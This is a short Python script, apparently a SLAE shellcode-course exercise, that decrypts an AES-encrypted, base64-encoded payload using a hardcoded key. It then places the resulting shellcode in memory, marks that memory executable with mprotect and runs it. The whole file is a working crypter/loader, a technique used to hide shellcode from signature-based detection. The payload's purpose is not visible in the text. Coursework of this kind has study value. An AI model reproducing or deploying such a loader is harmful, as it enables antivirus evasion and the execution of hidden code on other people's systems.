# Description: Run the encrypted bytes for x86 SLAE
# Author: davidlebr1

import base64
import hashlib
import binascii
from ctypes import *
from Crypto import Random
from Crypto.Cipher import AES

# Encrypted with AES
encrypted_payload = "L/JfoqpQn0JOH0BPsL6UIBC7jXCSKkieH87jiZ97S6k2NjIzcE6etFIIMgvmUyXi"

class AESCrypter(object):

    def __init__(self, key):
        self.key = hashlib.sha256(key.encode("utf-8")).digest()

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:]))

    def _pad(self, s):
        return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]

if __name__ == '__main__':
    c = AESCrypter(key="thisismysuperkey")
    raw = c.decrypt(encrypted_payload)
    shellcode = ""
    print("[+] Decrypted Shellcode of {} bytes: {}".format(len(raw), format(''.join('\\x' + hex(byte)[2:] for byte in bytearray(raw)))))
    print("[+] Running the shellcode now")
    libc = CDLL('libc.so.6')
    sc = c_char_p(raw)
    size = len(raw)
    addr = c_void_p(libc.valloc(size))
    memmove(addr, sc, size)
    libc.mprotect(addr, size, 0x7)
    run = cast(addr, CFUNCTYPE(c_void_p))
    run()